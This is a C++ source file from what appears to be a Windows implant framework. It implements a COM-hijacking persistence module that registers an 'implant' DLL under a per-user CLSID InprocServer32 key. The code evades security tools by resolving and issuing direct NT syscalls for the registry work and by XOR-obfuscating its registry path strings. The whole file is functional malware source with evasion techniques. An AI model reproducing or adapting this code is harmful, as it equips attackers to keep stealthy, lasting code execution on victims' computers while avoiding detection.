#include "ComHijacker.h"
#include "../evasion/Syscalls.h"
#include "../evasion/NtStructs.h"
#include "../utils/Obfuscator.h"
#include "../utils/Logger.h"
#include "../utils/Shared.h"
#include <vector>
#include <sstream>

namespace persistence {

namespace {
    // "Software\\Classes\\CLSID\\"
    std::wstring kClsidPath = L"\x03\x35\x3c\x20\x23\x35\x24\x31\x0e\x0e\x17\x38\x35\x37\x27\x27\x31\x27\x0e\x0e\x17\x18\x03\x1d\x10\x0e\x0e";
    // "InprocServer32"
    std::wstring kInproc = L"\x1d\x34\x20\x22\x3b\x37\x07\x31\x26\x22\x31\x22\x67\x66";
    // "ThreadingModel"
    std::wstring kThreadingModel = L"\x00\x3c\x26\x31\x35\x30\x3d\x34\x33\x19\x3b\x30\x31\x38";
    // "Both"
    std::wstring kBoth = L"\x16\x3b\x20\x3c";
}

bool ComHijacker::Install(const std::wstring& implantPath, const std::wstring& clsid) {
    LOG_DEBUG("ComHijacker::Install started");

    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntSetValueKeySsn = resolver.GetServiceNumber("NtSetValueKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    if (ntOpenKeySsn == 0xFFFFFFFF || ntSetValueKeySsn == 0xFFFFFFFF || ntCloseSsn == 0xFFFFFFFF) return false;

    std::wstring hkcuPath = L"\\Registry\\User\\" + sid;
    UNICODE_STRING uHkcu;
    uHkcu.Buffer = (PWSTR)hkcuPath.c_str();
    uHkcu.Length = (USHORT)(hkcuPath.length() * sizeof(wchar_t));
    uHkcu.MaximumLength = uHkcu.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uHkcu, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hHkcu = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hHkcu, (PVOID)(UINT_PTR)(KEY_ENUMERATE_SUB_KEYS | KEY_QUERY_VALUE | KEY_CREATE_SUB_KEY), &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

    if (!NT_SUCCESS(status)) return false;

    std::wstring relativePath = utils::DecryptW(kClsidPath) + clsid + L"\\" + utils::DecryptW(kInproc);
    HANDLE hKey = NULL;
    status = (NTSTATUS)utils::Shared::NtCreateKeyRelative(hHkcu, relativePath, &hKey);

    InternalDoSyscall(ntCloseSsn, hHkcu, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

    if (NT_SUCCESS(status)) {
        UNICODE_STRING uEmpty = {0, 0, NULL};
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uEmpty, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)implantPath.c_str(), (PVOID)(UINT_PTR)((implantPath.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);

        std::wstring tm = utils::DecryptW(kThreadingModel);
        UNICODE_STRING uTm;
        uTm.Buffer = (PWSTR)tm.c_str();
        uTm.Length = (USHORT)(tm.length() * sizeof(wchar_t));
        uTm.MaximumLength = uTm.Length + sizeof(wchar_t);

        std::wstring tmVal = utils::DecryptW(kBoth);
        InternalDoSyscall(ntSetValueKeySsn, hKey, &uTm, NULL, (PVOID)(UINT_PTR)REG_SZ, (PVOID)tmVal.c_str(), (PVOID)(UINT_PTR)((tmVal.length() + 1) * sizeof(wchar_t)), NULL, NULL, NULL, NULL, NULL);

        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        return true;
    }

    return false;
}

bool ComHijacker::Verify(const std::wstring& clsid) {
    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;

    std::wstring fullPath = L"\\Registry\\User\\" + sid + L"\\" + utils::DecryptW(kClsidPath) + clsid + L"\\" + utils::DecryptW(kInproc);

    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");

    UNICODE_STRING uPath;
    uPath.Buffer = (PWSTR)fullPath.c_str();
    uPath.Length = (USHORT)(fullPath.length() * sizeof(wchar_t));
    uPath.MaximumLength = uPath.Length + sizeof(wchar_t);

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    HANDLE hKey = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, (PVOID)(UINT_PTR)KEY_READ, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (NT_SUCCESS(status)) {
        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        return true;
    }
    return false;
}

bool ComHijacker::Uninstall(const std::wstring& clsid) {
    std::wstring sid = utils::GetCurrentUserSid();
    if (sid.empty()) return false;
    std::wstring fullPath = L"\\Registry\\User\\" + sid + L"\\" + utils::DecryptW(kClsidPath) + clsid;
    auto& resolver = evasion::SyscallResolver::GetInstance();
    DWORD ntOpenKeySsn = resolver.GetServiceNumber("NtOpenKey");
    DWORD ntDeleteKeySsn = resolver.GetServiceNumber("NtDeleteKey");
    DWORD ntCloseSsn = resolver.GetServiceNumber("NtClose");
    UNICODE_STRING uPath;
    uPath.Buffer = (PWSTR)fullPath.c_str();
    uPath.Length = (USHORT)(fullPath.length() * sizeof(wchar_t));
    uPath.MaximumLength = uPath.Length + sizeof(wchar_t);
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &uPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
    HANDLE hKey = NULL;
    NTSTATUS status = InternalDoSyscall(ntOpenKeySsn, &hKey, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &objAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (NT_SUCCESS(status)) {
        std::wstring subPath = fullPath + L"\\" + utils::DecryptW(kInproc);
        UNICODE_STRING uSubPath;
        uSubPath.Buffer = (PWSTR)subPath.c_str();
        uSubPath.Length = (USHORT)(subPath.length() * sizeof(wchar_t));
        uSubPath.MaximumLength = uSubPath.Length + sizeof(wchar_t);
        OBJECT_ATTRIBUTES subAttr;
        InitializeObjectAttributes(&subAttr, &uSubPath, OBJ_CASE_INSENSITIVE, NULL, NULL);
        HANDLE hSubKey = NULL;
        if (NT_SUCCESS(InternalDoSyscall(ntOpenKeySsn, &hSubKey, (PVOID)(UINT_PTR)KEY_ALL_ACCESS, &subAttr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL))) {
            InternalDoSyscall(ntDeleteKeySsn, hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
            InternalDoSyscall(ntCloseSsn, hSubKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        }
        status = InternalDoSyscall(ntDeleteKeySsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        InternalDoSyscall(ntCloseSsn, hKey, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }
    return NT_SUCCESS(status);
}

} // namespace persistence
